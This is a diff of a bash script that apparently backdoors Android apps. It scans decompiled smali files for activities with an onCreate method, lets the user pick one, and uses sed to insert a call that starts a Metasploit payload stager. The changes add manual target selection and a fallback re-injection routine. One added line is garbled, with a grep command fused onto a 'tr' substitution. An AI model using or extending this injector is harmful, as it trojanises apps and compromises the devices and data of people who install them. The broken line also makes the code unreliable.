@@ -79,13 +79,17 @@ browse_smali(){
         ext="nil"
     fi
         if [ "$ext" == "smali" ]; then
-        	if [ "$mode" == "auto" ]; then
+        if [ "$mode" == "manual" ]; then        		
         		if [ "$fl" != "$i" ]; then
-        	echo $counter. $filename >> smalifiles
-        	counter+=1
+        	if ! [ -z "$(cat $i | grep -i "invoke-super.*onCreate(Landroid\/os\/Bundle;)V")" ]; then
+        		echo $counter. $i >> smalifiles
+        		counter+=1
+        	fi        	
         	fl=$i
+        	continue
         fi
-        fi
+    
+        fi        
         	if [ -z $x ]; then	        		
 		exit 1
 	fi
@@ -128,7 +132,7 @@ embed(){
 		read -r y < smaliloc.tmp
 		rm smaliloc.tmp
 		x=$(cat $y | grep -w invoke | sed 's/.*\,//' | sed 's/\;.*//' | sed 's/L//').smali
-		x=$(tr -d ' ' <<< $x)
+		x=$(tr -d ' ' <<< $x)grep -i "invoke-super.*onCreate.*(Landroid\/os\/Bundle;)V"
 		for i in */* ;
 			do
 				if [ -f $i/$x ]; then
@@ -140,8 +144,6 @@ fi
 		hok=1
 		return 1
 	fi
-	#echo $(wc -l <<< $x)
-	#read -r enterkey
 	while [ "$(wc -l <<< $x)" != "1" ]
 		do
 			x=$(sed 1d <<< $x)
@@ -162,12 +164,12 @@ fi
 	
 	read -r x <<<$x
 	if [ "$x" != "" ]; then
-	msg="Injecting Hook Into Smali File"
+	msg="Injecting Hook Into $x"
 		if [ "$1" == "fallback" ]; then
 			hook=v0
 			ln=$(grep -n -w metasploit $x | sed 's/:.*//')
 			sed -i ''$ln'd' $x
-			msg="Something Went Wrong, Re-Injecting Hook Into Smali File"
+			msg="Something Went Wrong, Re-Injecting Hook Into $x"
 		fi
 		echo "+ $msg"
         	 sed -i '/->onCreate(Landroid\/os\/Bundle;)V/a \    invoke-static {'$hook'}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V' $x
@@ -178,11 +180,18 @@ else echo "> Could Not Find Smali File To Inject Hook, See $logfile For Details"
 }
 
 manual_hook(){
+	echo "++ Looking For Injectable Smali Files"
+	ls original  | grep smali > smali_folders
+	while read -r folder || [[ -n $folder ]]; do
+	#pkg_name=$(cat original/AndroidManifest.xml | grep -w package | sed 's/.*package="//' | sed 's/\".*//')
+	#pkg_name=$(dirname $pkg_name)	
+	browse_smali original/$folder
+	done < smali_folders
+	rm smali_folders
 	bat smalifiles
 	echo -n "Choose Smali File To Inject Hook In ==> "
 	read -r opt
-	x=$(grep -w $opt smalifiles | sed 's/.*[[:space:]]//' | sed 's/\..*//')	
-	x=$(browse_smali original $x)
+	x=$(grep -w $opt smalifiles | sed 's/.*[[:space:]]//')	
 	embed "manual"
 }
 
